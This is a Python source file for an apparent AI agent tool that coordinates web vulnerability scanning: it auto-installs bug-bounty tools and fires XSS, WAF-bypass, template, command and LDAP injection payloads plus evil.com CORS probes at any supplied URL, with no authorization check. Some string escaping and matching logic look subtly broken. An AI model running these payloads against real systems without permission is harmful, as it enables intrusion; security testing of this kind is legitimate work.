#!/usr/bin/env python3
"""Advanced Payload Coordinator - Intelligent coordination of specialized vulnerability testing tools"""

import os
import subprocess
from typing import Any, Dict, List

from strands import tool


@tool
def advanced_payload_coordinator(target_url: str, test_type: str = "comprehensive", parameters: str = None) -> str:
    """
    Coordinates advanced payload testing using specialized external tools.

    Intelligently installs and coordinates tools like dalfox (XSS), arjun (parameter discovery),
    corsy (CORS), and others from awesome-bugbounty-tools for sophisticated testing
    beyond what basic sqlmap/nmap can provide.

    Args:
        target_url: Target URL with parameters (e.g., https://site.com/search?q=test)
        test_type: Type of testing ("xss", "param_discovery", "cors", "comprehensive")
        parameters: Specific parameters to test (comma-separated)

    Returns:
        Advanced payload testing results with intelligent analysis
    """
    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    results = {
        "target": target_url,
        "test_type": test_type,
        "parameters_discovered": [],
        "vulnerabilities": [],
        "payload_results": [],
        "intelligence": {
            "severity_distribution": {},
            "attack_vectors": [],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    }

    output = f"Advanced Payload Coordinator: {target_url}\\n"
    output += "=" * 60 + "\\n\\n"

    try:
        # Phase 1: Setup specialized testing tools
        output += "Phase 1: Setting up specialized payload tools\\n"
        output += "-" * 40 + "\\n"

        tools_setup = _setup_payload_tools()
        if tools_setup["success"]:
            output += f"✓ Configured {len(tools_setup['tools'])} specialized tools\\n"
        else:
            output += "⚠ Some tools unavailable, using alternative methods\\n"

        output += "\\n"

        # Phase 2: Parameter discovery and expansion
        if test_type in ["param_discovery", "comprehensive"]:
            output += "Phase 2: Advanced Parameter Discovery\\n"
            output += "-" * 40 + "\\n"

            discovered_params = _advanced_parameter_discovery(target_url, parameters)
            results["parameters_discovered"] = discovered_params

            output += f"Discovered {len(discovered_params)} parameters:\\n"
            for param in discovered_params[:10]:
                output += f"  • {param}\\n"
            output += "\\n"

        # Phase 3: XSS payload coordination and testing
        if test_type in ["xss", "comprehensive"]:
            output += "Phase 3: Advanced XSS Payload Testing\\n"
            output += "-" * 40 + "\\n"

            xss_results = _coordinate_xss_testing(target_url, results.get("parameters_discovered", []))
            results["payload_results"].extend(xss_results)

            xss_vulns = [r for r in xss_results if r.get("vulnerable", False)]
            output += f"XSS testing completed: {len(xss_vulns)} potential vulnerabilities\\n"
            for vuln in xss_vulns[:3]:
                output += f"  • {vuln['parameter']}: {vuln['payload_type']}\\n"
            output += "\\n"

        # Phase 4: CORS misconfiguration testing
        if test_type in ["cors", "comprehensive"]:
            output += "Phase 4: CORS Misconfiguration Analysis\\n"
            output += "-" * 40 + "\\n"

            cors_results = _test_cors_configurations(target_url)
            results["payload_results"].extend(cors_results)

            cors_issues = [r for r in cors_results if r.get("vulnerable", False)]
            output += f"CORS analysis: {len(cors_issues)} misconfigurations detected\\n"
            for issue in cors_issues[:2]:
                output += f"  • {issue['issue_type']}: {issue['description']}\\n"
            output += "\\n"

        # Phase 5: Advanced injection coordination (non-SQL)
        if test_type == "comprehensive":
            output += "Phase 5: Advanced Injection Testing\\n"
            output += "-" * 40 + "\\n"

            injection_results = _coordinate_injection_testing(target_url, results.get("parameters_discovered", []))
            results["payload_results"].extend(injection_results)

            injection_vulns = [r for r in injection_results if r.get("vulnerable", False)]
            output += f"Injection testing: {len(injection_vulns)} potential vulnerabilities\\n"
            for vuln in injection_vulns[:3]:
                output += f"  • {vuln['injection_type']}: {vuln['parameter']}\\n"
            output += "\\n"

        # Phase 6: Intelligence analysis and payload coordination
        output += "Phase 6: Payload Intelligence Analysis\\n"
        output += "-" * 40 + "\\n"

        intelligence = _analyze_payload_intelligence(results["payload_results"])
        results["intelligence"] = intelligence

        output += (
            f"Total vulnerabilities: {len([r for r in results['payload_results'] if r.get('vulnerable', False)])}\\n"
        )
        output += f"Attack vectors identified: {len(intelligence['attack_vectors'])}\\n"
        output += f"Bypass techniques: {len(intelligence['bypass_techniques'])}\\n"

        if intelligence["attack_vectors"]:
            output += "\\nPrimary attack vectors:\\n"
            for vector in intelligence["attack_vectors"][:3]:
                output += f"  • {vector}\\n"

        output += "\\n"

        # Generate coordinated exploitation recommendations
        recommendations = _generate_payload_recommendations(results)
        output += "EXPLOITATION COORDINATION:\\n"
        for i, rec in enumerate(recommendations, 1):
            output += f"{i}. {rec}\\n"

    except Exception as e:
        output += f"Payload coordination failed: {str(e)}\\n"

    return output


def _setup_payload_tools() -> Dict[str, Any]:
    """Setup specialized payload testing tools"""
    tools_status = {"success": True, "tools": [], "failed": []}

    # Specialized tools from awesome-bugbounty-tools
    specialized_tools = [
        ("dalfox", "github.com/hahwul/dalfox/v2@latest"),
        ("arjun", None),  # Python tool, installed via pip
        ("corsy", None),  # Python tool, installed via pip
        ("httpx", "github.com/projectdiscovery/httpx/cmd/httpx@latest"),
        ("paramspider", None),  # Python tool
        ("qsreplace", "github.com/tomnomnom/qsreplace@latest"),
    ]

    for tool_name, install_path in specialized_tools:
        try:
            # Check if tool exists
            check_cmd = ["which", tool_name]
            if subprocess.run(check_cmd, capture_output=True).returncode == 0:
                tools_status["tools"].append(tool_name)
                continue

            if install_path:
                # Go-based tool
                install_cmd = ["go", "install", install_path]
                result = subprocess.run(install_cmd, capture_output=True, timeout=60)
                if result.returncode == 0:
                    tools_status["tools"].append(tool_name)
                else:
                    tools_status["failed"].append(tool_name)
            else:
                # Python tool - try pip install
                pip_names = {"arjun": "arjun", "corsy": "corsy", "paramspider": "ParamSpider"}
                if tool_name in pip_names:
                    install_cmd = ["pip3", "install", pip_names[tool_name]]
                    result = subprocess.run(install_cmd, capture_output=True, timeout=120)
                    if result.returncode == 0:
                        tools_status["tools"].append(tool_name)
                    else:
                        tools_status["failed"].append(tool_name)
        except Exception:
            tools_status["failed"].append(tool_name)
            if tools_status["failed"]:
                tools_status["success"] = False

    return tools_status


def _advanced_parameter_discovery(target_url: str, provided_params: str = None) -> List[str]:
    """Advanced parameter discovery using multiple techniques"""
    discovered_params = set()

    # Add provided parameters
    if provided_params:
        provided_list = [p.strip() for p in provided_params.split(",") if p.strip()]
        discovered_params.update(provided_list)

    # Method 1: Arjun parameter discovery (if available)
    try:
        cmd = ["arjun", "-u", target_url, "--get", "--post", "-t", "20", "-q"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0 and result.stdout:
            # Parse arjun output for parameters
            lines = result.stdout.split("\\n")
            for line in lines:
                if "parameter" in line.lower() and ":" in line:
                    # Extract parameter name from arjun output
                    parts = line.split(":")
                    if len(parts) > 1:
                        param = parts[1].strip().split()[0]
                        if param and param.isalnum():
                            discovered_params.add(param)
    except Exception:
        pass

    # Method 2: ParamSpider (if available)
    try:
        from urllib.parse import urlparse

        domain = urlparse(target_url).netloc

        cmd = ["paramspider", "-d", domain, "--level", "high", "-q"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)

        if result.returncode == 0:
            # ParamSpider creates output files, try to read them
            output_file = f"output/{domain}.txt"
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    for line in f:
                        if "?" in line:
                            from urllib.parse import parse_qs, urlparse

                            try:
                                parsed = urlparse(line.strip())
                                params = parse_qs(parsed.query)
                                discovered_params.update(params.keys())
                            except Exception:
                                continue
    except Exception:
        pass

    # Method 3: Common parameter wordlist
    common_params = [
        "id",
        "user",
        "username",
        "email",
        "password",
        "token",
        "api_key",
        "page",
        "limit",
        "offset",
        "sort",
        "order",
        "search",
        "query",
        "q",
        "filter",
        "category",
        "type",
        "format",
        "callback",
        "jsonp",
        "redirect",
        "url",
        "path",
        "file",
        "filename",
        "action",
        "method",
        "debug",
        "test",
        "admin",
        "auth",
        "session",
        "lang",
        "locale",
    ]
    discovered_params.update(common_params)

    # Method 4: Extract from URL if it has parameters
    from urllib.parse import parse_qs, urlparse

    try:
        parsed_url = urlparse(target_url)
        if parsed_url.query:
            url_params = parse_qs(parsed_url.query)
            discovered_params.update(url_params.keys())
    except Exception:
        pass

    return sorted(list(discovered_params))


def _coordinate_xss_testing(target_url: str, parameters: List[str]) -> List[Dict[str, Any]]:
    """Coordinate XSS testing using advanced payloads and techniques"""
    xss_results = []

    if not parameters:
        return xss_results

    # Method 1: DalFox advanced XSS testing (if available)
    try:
        for param in parameters[:10]:  # Test first 10 parameters
            # Create test URL with parameter
            separator = "&" if "?" in target_url else "?"
            test_url = f"{target_url}{separator}{param}=FUZZ"

            cmd = [
                "dalfox",
                "url",
                test_url,
                "-b",
                "https://dalfox-xss-test.com",  # Use public XSS hunter
                "--mining-dict",
                "--skip-bav",
                "--silence",
                "--timeout",
                "10",
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0 and result.stdout:
                # Parse dalfox results
                if "POC" in result.stdout or "XSS" in result.stdout:
                    xss_results.append(
                        {
                            "parameter": param,
                            "vulnerable": True,
                            "payload_type": "Advanced XSS (DalFox)",
                            "evidence": result.stdout[:200],
                            "tool": "dalfox",
                        }
                    )
                else:
                    xss_results.append(
                        {"parameter": param, "vulnerable": False, "payload_type": "XSS tested", "tool": "dalfox"}
                    )

    except Exception:
        pass

    # Method 2: Modern XSS payloads with realistic exploitation context
    advanced_xss_payloads = [
        # Basic reflection tests
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # Context-aware payloads
        "'\\\"><script>alert(1)</script>",  # Breaking out of attributes
        "\\\";alert(1);//",  # Breaking out of JavaScript strings
        "<iframe src=javascript:alert(1)>",
        # Modern DOM-based
        "<input onfocus=alert(1) autofocus>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        # WAF bypass variants
        "<svg/onload=alert(1)>",  # No space after tag
        "<<script>alert(1)</script>",  # Double tag
        "<script>alert`1`</script>",  # Template literals
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<svg><script>alert(1)</script></svg>",  # SVG context
        # Polyglot attempts
        "'\\\"><svg/onload=alert(1)>",
    ]

    # Test parameters not covered by dalfox
    tested_params = {r["parameter"] for r in xss_results}
    remaining_params = [p for p in parameters if p not in tested_params]

    for param in remaining_params[:5]:  # Test remaining parameters
        for payload in advanced_xss_payloads[:3]:  # Test first 3 payloads
            try:
                # Create test request
                separator = "&" if "?" in target_url else "?"
                test_url = f"{target_url}{separator}{param}={payload}"

                cmd = ["curl", "-s", "--max-time", "10", test_url]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

                if result.returncode == 0:
                    response = result.stdout
                    # Check if payload is reflected WITHOUT encoding (actual XSS risk)
                    # Avoid false positives: reflected ≠ executed
                    if payload in response:
                        # Check if it's reflected unencoded (real risk)
                        if not any(
                            encoded in response
                            for encoded in [
                                payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML entity encoded
                                payload.replace("<", "\\x3c").replace(">", "\\x3e"),  # Hex encoded
                                payload.replace("<", "\\u003c").replace(">", "\\u003e"),  # Unicode encoded
                            ]
                        ):
                            xss_results.append(
                                {
                                    "parameter": param,
                                    "vulnerable": True,
                                    "payload_type": "Reflected XSS (unencoded)",
                                    "evidence": f"Payload reflected unencoded: {payload[:50]}...",
                                    "tool": "custom",
                                }
                            )
                            break  # Found vulnerability, no need to test more payloads
                        else:
                            # Reflected but encoded = not exploitable
                            xss_results.append(
                                {
                                    "parameter": param,
                                    "vulnerable": False,
                                    "payload_type": "Reflected but encoded (not exploitable)",
                                    "evidence": f"Payload reflected with encoding",
                                    "tool": "custom",
                                }
                            )
                            break

            except Exception:
                continue

        # If no vulnerability found, add negative result
        if param not in {r["parameter"] for r in xss_results}:
            xss_results.append(
                {"parameter": param, "vulnerable": False, "payload_type": "XSS tested", "tool": "custom"}
            )

    return xss_results


def _test_cors_configurations(target_url: str) -> List[Dict[str, Any]]:
    """Test CORS configurations using specialized techniques"""
    cors_results = []

    # Method 1: Corsy tool (if available)
    try:
        cmd = ["corsy", "-u", target_url, "-t", "20"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        if result.returncode == 0 and result.stdout:
            # Parse corsy output
            if "vulnerable" in result.stdout.lower():
                cors_results.append(
                    {
                        "vulnerable": True,
                        "issue_type": "CORS Misconfiguration",
                        "description": "Corsy detected CORS vulnerability",
                        "evidence": result.stdout[:200],
                        "tool": "corsy",
                    }
                )
            else:
                cors_results.append(
                    {
                        "vulnerable": False,
                        "issue_type": "CORS Configuration",
                        "description": "No CORS issues detected by Corsy",
                        "tool": "corsy",
                    }
                )
    except Exception:
        pass

    # Method 2: Manual CORS testing
    if not cors_results:  # Only if corsy didn't run
        cors_test_origins = [
            "https://evil.com",
            "null",
            target_url.replace("https://", "https://evil."),
            target_url.replace("http://", "http://evil."),
            target_url[:-1] + ".evil.com",
        ]

        for origin in cors_test_origins[:2]:  # Test first 2 origins
            try:
                cmd = ["curl", "-s", "-I", "--max-time", "10"] + ["-H", f"Origin: {origin}"] + [target_url]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

                if result.returncode == 0:
                    # Check for permissive CORS headers
                    response = result.stdout.lower()
                    if "access-control-allow-origin" in response:
                        if origin in response or "*" in response:
                            cors_results.append(
                                {
                                    "vulnerable": True,
                                    "issue_type": "Permissive CORS",
                                    "description": f"Server allows origin: {origin}",
                                    "evidence": f"Access-Control-Allow-Origin header allows {origin}",
                                    "tool": "manual",
                                }
                            )
                            break
            except Exception:
                continue

        # Add negative result if no issues found
        if not cors_results:
            cors_results.append(
                {
                    "vulnerable": False,
                    "issue_type": "CORS Configuration",
                    "description": "No obvious CORS misconfigurations detected",
                    "tool": "manual",
                }
            )

    return cors_results


def _coordinate_injection_testing(target_url: str, parameters: List[str]) -> List[Dict[str, Any]]:
    """Coordinate advanced injection testing (beyond SQL)"""
    injection_results = []

    if not parameters:
        return injection_results

    # Template injection payloads
    template_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "{{config.items()}}",
        "${T(java.lang.System).getProperty('user.name')}",
    ]

    # Command injection payloads
    command_payloads = ["; whoami", "| whoami", "& whoami", "`whoami`", "$(whoami)"]

    # LDAP injection payloads
    ldap_payloads = ["*", "*)(&", "*))%00", "admin*)((|userPassword=*)", "*))(|(objectClass=*"]

    injection_types = [
        ("SSTI", template_payloads),
        ("Command Injection", command_payloads),
        ("LDAP Injection", ldap_payloads),
    ]

    # Test each parameter with different injection types
    for param in parameters[:5]:  # Limit to first 5 parameters
        for injection_type, payloads in injection_types:
            for payload in payloads[:2]:  # Test first 2 payloads of each type
                try:
                    # Create test URL
                    separator = "&" if "?" in target_url else "?"
                    test_url = f"{target_url}{separator}{param}={payload}"

                    cmd = ["curl", "-s", "--max-time", "10", test_url]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

                    if result.returncode == 0:
                        response = result.stdout

                        # Check for injection indicators
                        vulnerable = False
                        evidence = ""

                        if injection_type == "SSTI":
                            # Check for template evaluation
                            if "49" in response and payload == "{{7*7}}":
                                vulnerable = True
                                evidence = "Template evaluation detected (7*7=49)"
                            elif payload in response and "config" in payload:
                                vulnerable = True
                                evidence = "Configuration disclosure detected"

                        elif injection_type == "Command Injection":
                            # Check for command execution indicators
                            if any(indicator in response.lower() for indicator in ["root:", "uid=", "gid=", "whoami"]):
                                vulnerable = True
                                evidence = "Command execution indicators detected"

                        elif injection_type == "LDAP Injection":
                            # Check for LDAP error patterns or unexpected responses
                            if any(
                                indicator in response.lower()
                                for indicator in ["ldap", "invalid dn", "bad search filter"]
                            ):
                                vulnerable = True
                                evidence = "LDAP error patterns detected"

                        if vulnerable:
                            injection_results.append(
                                {
                                    "vulnerable": True,
                                    "injection_type": injection_type,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": evidence,
                                    "tool": "custom",
                                }
                            )
                            break  # Found vulnerability, test next parameter

                except Exception:
                    continue

    # Add summary for tested parameters without vulnerabilities
    tested_params = {r["parameter"] for r in injection_results if r.get("vulnerable", False)}
    for param in parameters[:5]:
        if param not in tested_params:
            injection_results.append(
                {
                    "vulnerable": False,
                    "injection_type": "Multiple injection types",
                    "parameter": param,
                    "tool": "custom",
                }
            )

    return injection_results


def _analyze_payload_intelligence(payload_results: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Analyze payload testing results for intelligence insights"""
    intelligence = {
        "severity_distribution": {},
        "attack_vectors": [],
        "bypass_techniques": [],
        "exploitation_chains": [],
    }

    # Count vulnerabilities by type
    vuln_types = {}
    vulnerable_results = [r for r in payload_results if r.get("vulnerable", False)]

    for result in vulnerable_results:
        vuln_type = result.get("payload_type") or result.get("injection_type") or result.get("issue_type", "Unknown")
        vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

    intelligence["severity_distribution"] = vuln_types

    # Identify primary attack vectors
    if vulnerable_results:
        for result in vulnerable_results:
            if "XSS" in str(result.get("payload_type", "")):
                intelligence["attack_vectors"].append("Client-side code injection via XSS")
            elif "Command Injection" in str(result.get("injection_type", "")):
                intelligence["attack_vectors"].append("Server-side command execution")
            elif "SSTI" in str(result.get("injection_type", "")):
                intelligence["attack_vectors"].append("Server-side template injection")
            elif "CORS" in str(result.get("issue_type", "")):
                intelligence["attack_vectors"].append("Cross-origin resource sharing abuse")
            elif "LDAP" in str(result.get("injection_type", "")):
                intelligence["attack_vectors"].append("LDAP directory manipulation")

    # Identify bypass techniques used
    for result in payload_results:
        if "WAF" in str(result.get("evidence", "")).upper():
            intelligence["bypass_techniques"].append("WAF bypass techniques")
        if "encoded" in str(result.get("payload", "")).lower():
            intelligence["bypass_techniques"].append("Encoding-based bypasses")
        if "String.fromCharCode" in str(result.get("payload", "")):
            intelligence["bypass_techniques"].append("JavaScript encoding bypass")

    # Suggest exploitation chains
    vuln_types_present = list(vuln_types.keys())
    if "XSS" in str(vuln_types_present) and "CORS" in str(vuln_types_present):
        intelligence["exploitation_chains"].append("XSS + CORS misconfiguration = Full account takeover")
    if "Command Injection" in str(vuln_types_present):
        intelligence["exploitation_chains"].append("Command injection = Remote code execution")
    if "SSTI" in str(vuln_types_present):
        intelligence["exploitation_chains"].append("SSTI = Server-side code execution and data exfiltration")

    # Remove duplicates
    intelligence["attack_vectors"] = list(set(intelligence["attack_vectors"]))
    intelligence["bypass_techniques"] = list(set(intelligence["bypass_techniques"]))

    return intelligence


def _generate_payload_recommendations(results: Dict[str, Any]) -> List[str]:
    """Generate coordinated payload exploitation recommendations"""
    recommendations = []

    vulnerable_results = [r for r in results["payload_results"] if r.get("vulnerable", False)]
    intelligence = results.get("intelligence", {})

    if not vulnerable_results:
        recommendations.append("No critical vulnerabilities detected - conduct manual verification")
        recommendations.append("Test additional parameters discovered during reconnaissance")
        recommendations.append("Perform authenticated testing if credentials are available")
        return recommendations

    # Severity-based recommendations
    if intelligence.get("severity_distribution"):
        high_severity = ["Command Injection", "SSTI", "Advanced XSS"]
        detected_high_severity = [
            vuln for vuln in intelligence["severity_distribution"].keys() if any(hs in vuln for hs in high_severity)
        ]

        if detected_high_severity:
            recommendations.append(
                "CRITICAL: High-severity vulnerabilities detected - prioritize immediate remediation"
            )
            recommendations.append("Implement comprehensive input validation and output encoding")

    # Attack vector recommendations
    if "Client-side code injection" in intelligence.get("attack_vectors", []):
        recommendations.append("Deploy Content Security Policy (CSP) headers to mitigate XSS attacks")
        recommendations.append("Implement proper output encoding for all user-controlled data")

    if "Server-side command execution" in intelligence.get("attack_vectors", []):
        recommendations.append("Remove or sandbox command execution functionality")
        recommendations.append("Implement strict input validation and use parameterized commands")

    if "Cross-origin resource sharing abuse" in intelligence.get("attack_vectors", []):
        recommendations.append("Review and restrict CORS policy to trusted origins only")
        recommendations.append("Implement proper authentication for cross-origin requests")

    # Exploitation chain recommendations
    if intelligence.get("exploitation_chains"):
        recommendations.append("Chain multiple vulnerabilities for maximum impact demonstration")
        recommendations.append("Document complete attack scenarios for stakeholder communication")

    # Testing expansion recommendations
    recommendations.append("Extend testing to authenticated endpoints and user roles")
    recommendations.append("Test for business logic vulnerabilities in identified workflows")
    recommendations.append("Perform payload variation testing to identify filter bypasses")

    return recommendations
